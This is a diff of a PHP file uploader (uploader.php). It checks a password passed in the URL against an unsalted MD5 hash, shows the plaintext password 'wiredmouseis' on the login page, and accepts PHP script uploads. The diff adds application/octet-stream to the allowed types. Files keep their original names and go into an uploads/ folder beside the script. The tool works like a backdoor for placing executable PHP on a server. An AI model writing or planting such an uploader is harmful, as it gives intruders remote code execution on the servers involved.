@@ -2,16 +2,24 @@
 session_start();
 
 /* ===== CONFIG (ONLY HASH STORED) ===== */
-$PASSWORD_HASH = "13631f1178a08863c6df2282efa79d6e";  // only hash, no plain password stored
+$PASSWORD_HASH = "13631f1178a08863c6df2282efa79d6e";  
 
 $UPLOAD_DIR = __DIR__ . "/uploads/";
-$ALLOWED = ['image/jpeg', 'image/png', 'text/plain', 'text/x-php', 'application/x-php', 'application/php'];
+
+/* Updated Allowed Types */
+$ALLOWED = [
+    'image/jpeg',
+    'image/png',
+    'text/plain',
+    'text/x-php',
+    'application/x-php',
+    'application/php',
+    'application/octet-stream'
+];
 
 /* ===== AUTH CHECK ===== */
 if (isset($_GET['p'])) {
-
     $input_hash = md5($_GET['p']);
-
     if (hash_equals($PASSWORD_HASH, $input_hash)) {
         $_SESSION['auth'] = true;
     } else {
@@ -28,14 +36,14 @@ if (isset($_GET['logout'])) {
 
 /* ===== UPLOAD ===== */
 if (isset($_SESSION['auth']) && isset($_FILES['file'])) {
-
     if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
-
+        
         $tmp = $_FILES['file']['tmp_name'];
         $mime = mime_content_type($tmp);
 
         if (!in_array($mime, $ALLOWED)) {
-            die("Invalid file type");
+            die("Invalid file type: <b>" . htmlspecialchars($mime) . "</b><br>
+                <a href='uploader.php'>Try Again</a>");
         }
 
         if (!is_dir($UPLOAD_DIR)) {
@@ -43,10 +51,14 @@ if (isset($_SESSION['auth']) && isset($_FILES['file'])) {
         }
 
         $name = bin2hex(random_bytes(8)) . "_" . basename($_FILES['file']['name']);
-
-        move_uploaded_file($tmp, $UPLOAD_DIR . $name);
-
-        echo "Uploaded successfully<br><a href='uploader.php'>Back</a>";
+        
+        if (move_uploaded_file($tmp, $UPLOAD_DIR . $name)) {
+            echo "✅ Uploaded successfully!<br><br>";
+            echo "File: " . htmlspecialchars($name) . "<br><br>";
+            echo "<a href='uploader.php'>← Back to Upload</a>";
+        } else {
+            echo "❌ Failed to save file.";
+        }
         exit;
     }
 }
@@ -64,7 +76,7 @@ if (isset($_SESSION['auth']) && isset($_FILES['file'])) {
 <?php if (empty($_SESSION['auth'])): ?>
 
 <p>Login via URL:</p>
-<code>?p=test123</code>
+<code>?p=wiredmouseis</code>
 
 <?php else: ?>
 
